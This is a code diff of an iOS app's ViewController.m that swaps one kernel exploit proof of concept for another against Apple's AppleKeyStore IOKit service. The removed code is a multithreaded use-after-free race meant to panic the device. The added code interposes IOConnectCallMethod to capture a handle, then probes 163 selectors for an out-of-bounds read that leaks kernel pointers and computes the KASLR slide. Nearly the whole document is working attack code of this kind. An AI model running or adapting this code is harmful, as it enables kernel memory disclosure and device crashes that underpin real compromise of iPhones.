@@ -1,147 +1,231 @@
+//
+//  ViewController.m
+//  Test — CVE-2026-65343 AppleKeyStore OOB read → KASLR
+//  UI: кнопка запускает probe, результат на экран (в UITextView)
+//
 #import "ViewController.h"
 #import <IOKit/IOKitLib.h>
 #import <mach/mach.h>
-#import <pthread.h>
-#import <stdatomic.h>
+#import <dlfcn.h>
+#import <Security/Security.h>
+#import <Foundation/Foundation.h>
 
-#define AKS_SERVICE_NAME "AppleKeyStore"
-#define NUM_CALLERS 8
-#define NUM_CLOSERS 4
-#define NUM_ITERATIONS 100000
+static UITextView *g_log;
+static void logline(NSString *s) {
+    NSLog(@"%@", s);
+    dispatch_async(dispatch_get_main_queue(), ^{
+        g_log.text = [g_log.text stringByAppendingFormat:@"%@\n", s];
+    });
+}
 
-static mach_port_t g_master_port = MACH_PORT_NULL;
-static _Atomic(io_connect_t) g_conn = IO_OBJECT_NULL;
-static atomic_bool g_done = false;
-static atomic_uint g_calls = 0;
-static atomic_uint g_closes = 0;
-static atomic_uint g_opens = 0;
+/* DYLD_INTERPOSE для перехвата IOConnectCallMethod */
+#ifndef DYLD_INTERPOSE
+#define DYLD_INTERPOSE(_replacement, _replacee)                          \
+    __attribute__((used))                                                 \
+    static struct { const void *replacement; const void *replacee; }     \
+    _interpose_##_replacee                                                \
+    __attribute__((section("__DATA,__interpose"))) = {                   \
+        (const void *)(unsigned long)&(_replacement),                    \
+        (const void *)(unsigned long)&(_replacee)                        \
+    };
+#endif
 
-static void *caller_thread(void *arg) {
-    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+typedef kern_return_t (*IOConnectCallMethod_fn)(
+    io_connect_t, uint32_t,
+    const uint64_t *, uint32_t,
+    const void *, size_t,
+    uint64_t *, uint32_t *,
+    void *, size_t *);
 
-    uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};
+static volatile int          g_capture_armed = 0;
+static volatile int          g_capture_done  = 0;
+static volatile io_connect_t g_cap_conn      = 0;
+static uint8_t               g_cap_handle[16];
 
-    while (!atomic_load(&g_done)) {
-        io_connect_t conn = atomic_load(&g_conn);
-        if (conn == IO_OBJECT_NULL) continue;
+static kern_return_t real_IOConnectCallMethod(
+    io_connect_t conn, uint32_t sel,
+    const uint64_t *scalin, uint32_t scalin_cnt,
+    const void *structin, size_t structin_sz,
+    uint64_t *scalout, uint32_t *scalout_cnt,
+    void *structout, size_t *structout_sz)
+{
+    static IOConnectCallMethod_fn fn = NULL;
+    if (!fn) fn = (IOConnectCallMethod_fn)dlsym(RTLD_NEXT, "IOConnectCallMethod");
+    if (!fn) return KERN_FAILURE;
+    return fn(conn, sel, scalin, scalin_cnt,
+              structin, structin_sz,
+              scalout, scalout_cnt,
+              structout, structout_sz);
+}
 
-        for (uint32_t sel = 0; sel < 16; sel++) {
-            IOConnectCallMethod(conn, sel, scalars, 6, NULL, 0, NULL, NULL, NULL, NULL);
-            atomic_fetch_add(&g_calls, 1);
+static kern_return_t my_IOConnectCallMethod(
+    io_connect_t conn, uint32_t sel,
+    const uint64_t *scalin, uint32_t scalin_cnt,
+    const void *structin, size_t structin_sz,
+    uint64_t *scalout, uint32_t *scalout_cnt,
+    void *structout, size_t *structout_sz)
+{
+    if (g_capture_armed && !g_capture_done && structin && structin_sz >= 16) {
+        const uint8_t *hdr = (const uint8_t *)structin;
+        int nonzero = 0;
+        for (int k = 0; k < 16; k++) if (hdr[k]) { nonzero = 1; break; }
+        if (nonzero) {
+            g_cap_conn = conn;
+            memcpy(g_cap_handle, hdr, 16);
+            __asm__ __volatile__("dmb ish" ::: "memory");
+            g_capture_done = 1;
+            logline([NSString stringWithFormat:@"[capture] conn=%#x sel=%u handle=%02x%02x%02x%02x%02x%02x%02x%02x...",
+                     conn, sel, hdr[0],hdr[1],hdr[2],hdr[3],hdr[4],hdr[5],hdr[6],hdr[7]]);
         }
     }
-    return NULL;
+    return real_IOConnectCallMethod(conn, sel, scalin, scalin_cnt,
+                                    structin, structin_sz,
+                                    scalout, scalout_cnt,
+                                    structout, structout_sz);
 }
 
-static void *closer_thread(void *arg) {
-    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+DYLD_INTERPOSE(my_IOConnectCallMethod, IOConnectCallMethod)
 
-    while (!atomic_load(&g_done)) {
-        io_connect_t conn = atomic_load(&g_conn);
-        if (conn == IO_OBJECT_NULL) continue;
-
-        IOServiceClose(conn);
-        atomic_store(&g_conn, IO_OBJECT_NULL);
-        atomic_fetch_add(&g_closes, 1);
+static int trigger_se_iokit_call(void) {
+    logline(@"[se] creating SE key (no biometric)...");
+    NSData *tag = [NSData dataWithBytes:"com.research.poc.aksprobe" length:25];
+    NSDictionary *delQ = @{
+        (id)kSecClass: (id)kSecClassKey,
+        (id)kSecAttrApplicationTag: tag,
+    };
+    SecItemDelete((__bridge CFDictionaryRef)delQ);
+    CFErrorRef cfErr = NULL;
+    SecAccessControlRef acl = SecAccessControlCreateWithFlags(
+        kCFAllocatorDefault, kSecAttrAccessibleAfterFirstUnlock, 0, &cfErr);
+    if (!acl) { logline(@"[se] acl fail"); return 0; }
+    NSDictionary *attrs = @{
+        (id)kSecAttrKeyType: (id)kSecAttrKeyTypeECSECPrimeRandom,
+        (id)kSecAttrKeySizeInBits: @256,
+        (id)kSecAttrTokenID: (id)kSecAttrTokenIDSecureEnclave,
+        (id)kSecAttrAccessControl: (__bridge id)acl,
+        (id)kSecPrivateKeyAttrs: @{(id)kSecAttrIsPermanent: @YES, (id)kSecAttrApplicationTag: tag},
+    };
+    SecKeyRef privKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attrs, &cfErr);
+    CFRelease(acl);
+    if (!privKey) {
+        NSString *d = cfErr ? [(__bridge NSError *)cfErr description] : @"?";
+        logline([NSString stringWithFormat:@"[se] key fail: %@", d]);
+        if (cfErr) CFRelease(cfErr);
+        return 0;
     }
-    return NULL;
+    logline(@"[se] key OK, signing...");
+    const uint8_t msg[32] = {0xDE,0xAD,0xBE,0xEF};
+    CFDataRef msgRef = CFDataCreate(NULL, msg, 32);
+    CFDataRef sig = SecKeyCreateSignature(privKey,
+        kSecKeyAlgorithmECDSASignatureMessageX962SHA256, msgRef, &cfErr);
+    CFRelease(msgRef); CFRelease(privKey);
+    if (sig) { logline([NSString stringWithFormat:@"[se] sign OK %ld bytes", (long)CFDataGetLength(sig)]); CFRelease(sig); return 1; }
+    NSString *d = cfErr ? [(__bridge NSError *)cfErr description] : @"?";
+    logline([NSString stringWithFormat:@"[se] sign fail: %@", d]);
+    if (cfErr) CFRelease(cfErr);
+    return g_capture_done ? 1 : 0;
 }
 
-@implementation ViewController
+#define OUTBUF_SZ 0x2000
+#define FILL_BYTE 0xBBu
+#define DECLARED  0x0800u
+#define KERN_BASE_STATIC 0xfffffff007004000ULL
+
+static int looks_like_kptr(uint64_t v) {
+    return ((v >> 32) == 0xfffffff0) && (v & 0xffffffffULL) != 0;
+}
+
+static uint64_t probe_selector(io_connect_t conn, const uint8_t handle[16], int sel) {
+    uint8_t msg[28];
+    memset(msg, 0, sizeof(msg));
+    memcpy(msg, handle, 16);
+    uint32_t decl = DECLARED;
+    memcpy(msg + 24, &decl, 4);
+    static uint8_t outbuf[OUTBUF_SZ];
+    memset(outbuf, FILL_BYTE, OUTBUF_SZ);
+    size_t outsz = OUTBUF_SZ;
+    uint64_t scalo[8] = {0};
+    uint32_t scaln = 8;
+    kern_return_t kr = real_IOConnectCallMethod(
+        conn, (uint32_t)sel, NULL, 0, msg, sizeof(msg),
+        scalo, &scaln, outbuf, &outsz);
+    int found = 0;
+    uint64_t slide = 0;
+    for (size_t i = 0; i + 8 <= outsz; i += 8) {
+        uint64_t v = 0;
+        memcpy(&v, outbuf + i, 8);
+        if (looks_like_kptr(v)) {
+            logline([NSString stringWithFormat:@"  sel=%d KPTR @+%04zx = %#018llx", sel, i, v]);
+            found++;
+            if (!slide) {
+                uint64_t known_off = 0x18d8774ULL;
+                if ((v & 0xfffULL) == ((KERN_BASE_STATIC + known_off) & 0xfffULL)) {
+                    slide = v - (KERN_BASE_STATIC + known_off);
+                    logline([NSString stringWithFormat:@"  -> KASLR slide = %#llx", slide]);
+                }
+            }
+        }
+    }
+    return slide;
+}
+
+- (void)runProbe {
+    logline(@"=== AKS OOB probe ===");
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleKeyStore"));
+    if (!svc) { logline(@"service not found"); return; }
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) { logline([NSString stringWithFormat:@"open fail %#x", kr]); return; }
+    logline([NSString stringWithFormat:@"open conn=%#x", conn]);
+
+    // Phase 1: попытка перехватить ACM handle через SE sign
+    g_capture_armed = 0; g_capture_done = 0; g_cap_conn = 0; memset(g_cap_handle, 0, 16);
+    __asm__ __volatile__("dmb ish" ::: "memory");
+    g_capture_armed = 1;
+    __asm__ __volatile__("dmb ish" ::: "memory");
+    int se_ok = trigger_se_iokit_call();
+    __asm__ __volatile__("dmb ish" ::: "memory");
+    g_capture_armed = 0;
+
+    NSData *tag = [NSData dataWithBytes:"com.research.poc.aksprobe" length:25];
+    NSDictionary *delQ = @{(id)kSecClass:(id)kSecClassKey,(id)kSecAttrApplicationTag:tag};
+    SecItemDelete((__bridge CFDictionaryRef)delQ);
+
+    if (!g_capture_done || !g_cap_conn) {
+        logline(@"phase1 fail — fallback zero-handle probe");
+        uint8_t zero_handle[16] = {0};
+        for (int sel = 1; sel <= 163; sel++) {
+            uint64_t slide = probe_selector(conn, zero_handle, sel);
+            if (slide) break;
+        }
+        return;
+    }
+    logline(@"phase1 OK — probing selectors with real handle");
+    for (int sel = 1; sel <= 163; sel++) {
+        uint64_t slide = probe_selector((io_connect_t)g_cap_conn, g_cap_handle, sel);
+        if (slide) break;
+    }
+}
 
 - (void)viewDidLoad {
     [super viewDidLoad];
     self.view.backgroundColor = [UIColor blackColor];
-    IOMainPort(MACH_PORT_NULL, &g_master_port);
-
     UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    btn.frame = CGRectMake(40, self.view.bounds.size.height/2 - 40, self.view.bounds.size.width - 80, 80);
-    [btn setTitle:@"UAF RACE" forState:UIControlStateNormal];
+    btn.frame = CGRectMake(20, 80, self.view.bounds.size.width - 40, 60);
+    [btn setTitle:@"AKS OOB PROBE" forState:UIControlStateNormal];
     [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
-    btn.backgroundColor = [UIColor redColor];
+    btn.backgroundColor = [UIColor systemBlueColor];
     btn.layer.cornerRadius = 10;
-    btn.titleLabel.font = [UIFont boldSystemFontOfSize:28];
-    [btn addTarget:self action:@selector(triggerUAFRace) forControlEvents:UIControlEventTouchUpInside];
+    btn.titleLabel.font = [UIFont boldSystemFontOfSize:22];
+    [btn addTarget:self action:@selector(runProbe) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:btn];
-
-    UILabel *label = [[UILabel alloc] initWithFrame:CGRectMake(40, self.view.bounds.size.height/2 + 45, self.view.bounds.size.width - 80, 80)];
-    label.text = @"8 callers + 4 closers race\n100k connections, no delay\nClient types: 0x2022/0xbeef/0x1337/0x4141";
-    label.textColor = [UIColor grayColor];
-    label.font = [UIFont systemFontOfSize:12];
-    label.textAlignment = NSTextAlignmentCenter;
-    label.numberOfLines = 4;
-    [self.view addSubview:label];
-}
-
-- (void)triggerUAFRace {
-    NSLog(@"[UAF RACE] Starting AppleKeyStore UAF race condition");
-    NSLog(@"[UAF RACE] %d callers, %d closers, %d iterations", NUM_CALLERS, NUM_CLOSERS, NUM_ITERATIONS);
-
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
-        io_service_t svc = IOServiceGetMatchingService(g_master_port, IOServiceMatching(AKS_SERVICE_NAME));
-        if (!svc) {
-            NSLog(@"[UAF RACE] AppleKeyStore service not found!");
-            return;
-        }
-        NSLog(@"[UAF RACE] AppleKeyStore service found");
-
-        atomic_store(&g_done, false);
-        atomic_store(&g_conn, IO_OBJECT_NULL);
-        atomic_store(&g_calls, 0);
-        atomic_store(&g_closes, 0);
-        atomic_store(&g_opens, 0);
-
-        pthread_t callers[NUM_CALLERS];
-        pthread_t closers[NUM_CLOSERS];
-
-        for (int i = 0; i < NUM_CALLERS; i++) {
-            pthread_create(&callers[i], NULL, caller_thread, NULL);
-        }
-        for (int i = 0; i < NUM_CLOSERS; i++) {
-            pthread_create(&closers[i], NULL, closer_thread, NULL);
-        }
-
-        NSLog(@"[UAF RACE] Spawned %d callers + %d closers, starting %d connections...",
-              NUM_CALLERS, NUM_CLOSERS, NUM_ITERATIONS);
-
-        for (int i = 0; i < NUM_ITERATIONS; i++) {
-            uint32_t type = (i % 4 == 0) ? 0x2022 :
-                            (i % 4 == 1) ? 0xbeef :
-                            (i % 4 == 2) ? 0x1337 : 0x4141;
-
-            io_connect_t conn = IO_OBJECT_NULL;
-            IOServiceOpen(svc, mach_task_self(), type, &conn);
-            atomic_store(&g_conn, conn);
-            atomic_fetch_add(&g_opens, 1);
-
-            if ((i + 1) % 10000 == 0) {
-                NSLog(@"[UAF RACE] Progress: %d/%d opens=%u calls=%u closes=%u",
-                      i + 1, NUM_ITERATIONS,
-                      atomic_load(&g_opens),
-                      atomic_load(&g_calls),
-                      atomic_load(&g_closes));
-            }
-        }
-
-        atomic_store(&g_done, true);
-
-        for (int i = 0; i < NUM_CALLERS; i++) {
-            pthread_join(callers[i], NULL);
-        }
-        for (int i = 0; i < NUM_CLOSERS; i++) {
-            pthread_join(closers[i], NULL);
-        }
-
-        io_connect_t final_conn = atomic_load(&g_conn);
-        if (final_conn != IO_OBJECT_NULL) {
-            IOServiceClose(final_conn);
-        }
-        IOObjectRelease(svc);
-
-        NSLog(@"[UAF RACE] Done. opens=%u calls=%u closes=%u",
-              atomic_load(&g_opens), atomic_load(&g_calls), atomic_load(&g_closes));
-        NSLog(@"[UAF RACE] If no panic, device may be patched or try again");
-    });
+    g_log = [[UITextView alloc] initWithFrame:CGRectMake(10, 160, self.view.bounds.size.width - 20, self.view.bounds.size.height - 180)];
+    g_log.backgroundColor = [UIColor darkGrayColor];
+    g_log.textColor = [UIColor greenColor];
+    g_log.font = [UIFont fontWithName:@"Menlo" size:11];
+    g_log.editable = NO;
+    g_log.text = @"press AKS OOB PROBE\n";
+    [self.view addSubview:g_log];
 }
 
 @end
